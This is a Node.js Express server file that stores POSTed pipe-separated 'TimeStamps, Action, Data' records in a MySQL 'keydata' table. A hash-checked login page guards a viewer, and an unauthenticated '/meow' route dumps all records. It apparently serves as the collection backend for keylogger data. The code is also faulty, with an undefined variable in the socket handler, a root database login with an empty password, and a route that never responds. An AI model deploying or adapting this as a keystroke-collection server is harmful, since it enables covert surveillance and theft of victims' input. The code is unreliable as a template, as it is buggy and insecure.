const multer = require('multer');
const bodyParser = require('body-parser');
const upload = multer();
const mysql = require('mysql');
var path = require('path');
var crypto = require('crypto');
const port = 1234,
      app = require('express')(),
      socket = require('socket.io')();
var serverInstance = app.listen(process.env.PORT || port, () => {
    console.log('App running at http://localhost:' + port);
});

var io = socket.attach(serverInstance);

app.use(bodyParser.json());
app.use(bodyParser.text());
app.use(bodyParser.urlencoded({ extended: true }));

var connection = mysql.createPool({ host: 'localhost', user: 'root', password: '', database: 'test' });


app.post('/', upload.any(), (req, res) => {
    console.log('\n-- INCOMING REQUEST AT ' + new Date().toISOString());
    console.log(req.method + ' ' + req.url);
    var lol = req.body;
    socket.emit('lol', lol);
    socket.emit('kitsune', lol);
});


app.post('/suffer', upload.any(), (req, res) => {
    console.log("Trying to log in");
    var password = req.body.password;
    var hash = crypto.createHash('sha256');
    data = hash.update(password, 'utf-8');
    gen_hash= data.digest('hex');
    var thehash = "f88071a322c835e2888e6e83c8af3c5cf05d863095470ff9040b370ea01ba04d";
    if (gen_hash==thehash) {
      res.redirect('/dataIsStoredHere');
    }
    else {
      res.redirect('/heh');
    }
});
socket.on("kitsune", (data) =>{
    var splitted = lol.toString().split("|");
    var one = splitted[0];
    var two = splitted[1];
    var three = splitted[2];
    var sqll = 'INSERT INTO keydata(TimeStamps, Action, Data) VALUES(?, ?, ?)';
    connection.query(sqll, [one, two, three], function (err, data) {
      if (err) throw err;
    });
});


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

app.get('/dataIsStoredHere', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.get('/heh', (req, res) => {
    res.sendFile(__dirname + '/wrong.html');
});

app.get('/meow', (req, res) => {
    connection.query('SELECT * FROM keydata ORDER BY TimeStamps DESC', function(error, results, fields) {
      if (error) throw error;
      res.send(results);
    });
});
